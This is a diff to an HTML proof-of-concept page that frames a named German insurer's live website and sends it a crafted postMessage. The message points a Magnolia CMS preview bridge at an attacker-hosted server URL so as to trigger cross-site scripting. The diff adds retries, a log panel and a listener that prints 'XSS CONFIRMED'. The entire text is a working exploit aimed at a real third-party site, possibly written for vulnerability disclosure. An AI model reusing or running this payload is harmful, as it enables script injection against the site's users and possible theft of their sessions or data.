@@ -1,21 +1,57 @@
 <!doctype html>
 <html>
-<head><meta charset="utf-8"><title>PoC</title></head>
+<head><meta charset="utf-8"><title>PoC</title>
+<style>
+  body { font-family: monospace; background: #111; color: #eee; padding: 16px; margin: 0; }
+  #log { background: #1a1a1a; border: 1px solid #333; padding: 8px; margin-bottom: 10px; font-size: 12px; white-space: pre; }
+  iframe { display: block; width: 100%; height: 500px; border: 2px solid #555; }
+</style>
+</head>
 <body>
-<iframe id="f" src="https://www.condor-versicherungen.de/?mgnlPreview=false"
-        width="1280" height="800" style="border:none"
-        sandbox="allow-scripts allow-same-origin allow-forms"></iframe>
+<div id="log">Waiting...</div>
+<iframe id="f" src="https://www.condor-versicherungen.de/?mgnlPreview=false" width="100%" height="500"></iframe>
 <script>
+var log = document.getElementById("log");
+function addLog(msg) {
+  log.textContent += "\n" + new Date().toISOString().slice(11,19) + " " + msg;
+}
+
+var base = location.href.substring(0, location.href.lastIndexOf("/"));
+var serverUrl = base + "/.magnolia/x";
+var payload = JSON.stringify({ action: "updateState", serverUrl: serverUrl });
+
+addLog("Base URL: " + base);
+addLog("serverUrl: " + serverUrl);
+addLog("Waiting for iframe to load...");
+
+var fired = false;
+
+function sendPayload() {
+  if (fired) return;
+  addLog("Sending postMessage...");
+  try {
+    document.getElementById("f").contentWindow.postMessage(payload, "*");
+    addLog("postMessage sent OK");
+  } catch(e) {
+    addLog("ERROR: " + e);
+  }
+}
+
 document.getElementById("f").onload = function() {
-  setTimeout(function() {
-    // base = directory where poc.html lives, e.g. https://trusthoodies.github.io/condor-poc
-    var base = location.href.substring(0, location.href.lastIndexOf("/"));
-    document.getElementById("f").contentWindow.postMessage(
-      JSON.stringify({ action: "updateState", serverUrl: base + "/.magnolia/x" }),
-      "*"
-    );
-  }, 2500);
+  addLog("iframe onload fired — trying at 1s, 2s, 3s, 5s, 8s...");
+  // Retry multiple times — bridge may init slower than load event
+  [1000, 2000, 3000, 5000, 8000].forEach(function(d) {
+    setTimeout(sendPayload, d);
+  });
 };
+
+// Receive confirmation
+window.addEventListener("message", function(ev) {
+  if (typeof ev.data === "string" && ev.data.indexOf("XSS:") === 0) {
+    fired = true;
+    addLog("✅ XSS CONFIRMED: " + ev.data);
+  }
+});
 </script>
 </body>
 </html>
